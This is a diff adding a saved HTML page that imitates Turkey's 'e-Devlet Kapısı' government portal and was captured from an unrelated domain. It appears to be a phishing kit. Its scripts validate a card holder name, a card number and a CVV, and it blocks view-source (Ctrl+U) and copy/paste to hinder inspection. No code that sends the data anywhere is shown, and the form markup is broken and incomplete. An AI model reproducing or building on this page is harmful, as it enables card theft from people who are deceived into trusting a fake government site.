@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<!-- saved from url=(0026)https://akpartimeclis.com/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Authentication forms">
+    <meta name="author" content="Arasari Studio">
+	<link rel="icon" type="image/x-icon" href="https://akpartimeclis.com/tema/img/favicon.png">
+
+    <title>e-Devlet Kapısı</title>
+    <link href="./index_files/bootstrap.min.css" rel="stylesheet">
+    <link href="./index_files/common.css" rel="stylesheet">
+	
+
+    
+<link href="./index_files/css" rel="stylesheet">
+<link href="./index_files/theme-03.css" rel="stylesheet">
+
+<script src="./index_files/jquery-3.2.1.min.js.indir" type="text/javascript"></script><script src="./index_files/jquery.creditCardValidator.js.indir"></script><script>
+function validate(){
+	var valid = true;	 
+    $(".demoInputBox").css('background-color','');
+    var message = "";
+
+    var cardHolderNameRegex = /^[a-z ,.'-]+$/i;
+    var cvvRegex = /^[0-9]{3,3}$/;
+    
+    var cardHolderName = $("#card-holder-name").val();
+    var cardNumber = $("#tach").val();
+    var cvv = $("#dogum").val();
+
+    if(cardHolderName == "" || cardNumber == "" || cvv == "") {
+    	   message  += "<div>Lütfen Tüm Alanları Doldurun.</div>";  
+    	   if(cardHolderName == "") {
+    		   $("#card-holder-name").css('background-color','#FFFFDF');
+    	   }
+    	   if(cardNumber == "") {
+    		   $("#tach").css('background-color','#FFFFDF');
+    	   }
+    	   if (cvv == "") {
+    		   $("#dogum").css('background-color','#FFFFDF');
+    	   }
+       valid = false;
+    }
+    
+    if (cardHolderName != "" && !cardHolderNameRegex.test(cardHolderName)) {
+        message  += "<div>Card Holder Name is Invalid</div>";    
+    		$("#card-holder-name").css('background-color','#FFFFDF');
+    		valid = false;
+    }
+    
+    if(cardNumber != "") {
+        	$('#tach').validateCreditCard(function(result){
+            if(!(result.valid)){
+                	message  += "<div>Kart Numarası Hatalı!</div>";    
+            		$("#tach").css('background-color','#FFFFDF');
+            		valid = false;
+            }
+        });
+    }
+    
+    if (cvv != "" && !cvvRegex.test(cvv)) {
+        message  += "<div>CVV Kodu Hatalı!</div>";    
+        $("#dogum").css('background-color','#FFFFDF');
+    		valid = false;
+    }
+    
+    if(message != "") {
+        $("#error-message").show();
+        $("#error-message").html(message);
+    }
+    return valid;
+}
+</script></head>
+
+
+
+
+
+
+
+
+
+		
+		
+
+
+
+
+
+    <div class="forny-container">
+        
+		
+<div class="forny-inner">
+    <div class="forny-form">
+        <div class="mb-8 text-center forny-logo">
+            <img src="./index_files/ofk.png">
+        </div>
+        <div class="text-center">
+            <h4>ahmetatilla.sex</h4>
+            <p class="mb-10"></p>
+        </div>
+        
+		
+		
+		
+
+
+            <div class="line mt-10 mb-6">
+                <span>© 2020 </span>
+            </div>
+
+            <div class="text-center">
+                <div class="d-inline-block mr-4">
+                    
+    <center><div id="error-message"></div></center>
+                          </div>
+
+
+
+                </div>
+            </section></div>
+
+            <br>
+							
+        
+    </div>
+</div></form>
+
+
+
+
+
+<!-- Login 1 end -->
+
+<script>
+document.onkeydown = function(e) {
+        if (e.ctrlKey && 
+            (e.keyCode === 85 )) {
+            return false;
+        }
+};
+</script>
+
+<script type="text/javascript">
+$(document).ready(function () {
+    //Disable full page
+    $('body').bind('cut copy paste', function (e) {
+        e.preventDefault();
+    });
+     
+    //Disable part of page
+    $('#id').bind('cut copy paste', function (e) {
+        e.preventDefault();
+    });
+});
+</script>
+
+<!-- credit-card -->
+		<script type="text/javascript" src="./index_files/creditly.js.indir"></script>
+		<script type="text/javascript">
+			$(function() {
+			  var creditly = Creditly.initialize(
+				  '.creditly-wrapper .expiration-month-and-year',
+				  '.creditly-wrapper .credit-card-number',
+				  '.creditly-wrapper .security-code',
+				  '.creditly-wrapper .card-type');
+
+			  $(".creditly-card-form .submit").click(function(e) {
+				e.preventDefault();
+				var output = creditly.validate();
+				if (output) {
+				  // Your validated credit card output
+				  console.log(output);
+				}
+			  });
+			});
+		</script>
+	<!-- //credit-card -->
+
+
+    
+
+
+
+</body></html>
